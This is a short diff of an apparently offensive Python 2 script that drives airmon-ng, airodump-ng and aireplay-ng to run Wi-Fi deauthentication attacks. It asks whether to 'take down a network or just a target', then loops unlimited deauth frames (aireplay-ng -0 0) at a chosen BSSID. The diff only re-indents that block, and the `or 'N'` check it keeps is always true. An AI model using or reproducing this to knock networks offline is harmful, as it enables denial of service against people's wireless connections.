@@ -19,12 +19,12 @@ if main_choice == 'b':
   os.system("airmon-ng start wlan0")
 if main_choice == 'c':
   lack = raw_input("Would you like to take down a network or just a target n/T:")
-if lack == 'n' or 'N':
-  os.system("airodump-ng wlan0mon")
-  t = raw_input("Enter the bssid of your target!:")
-  a = raw_input("Enter the channel of of your target:")
-  os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (a, t))
-  os.system("aireplay-ng -0 0 -a %s wlan0mon" % t)
+  if lack == 'n' or 'N':
+    os.system("airodump-ng wlan0mon")
+    t = raw_input("Enter the bssid of your target!:")
+    a = raw_input("Enter the channel of of your target:")
+    os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (a, t))
+    os.system("aireplay-ng -0 0 -a %s wlan0mon" % t)
 else:
   p = raw_input("Enter the bssid of your target!:")
   aireplay_client = raw_input("Enter the client you want to target:")
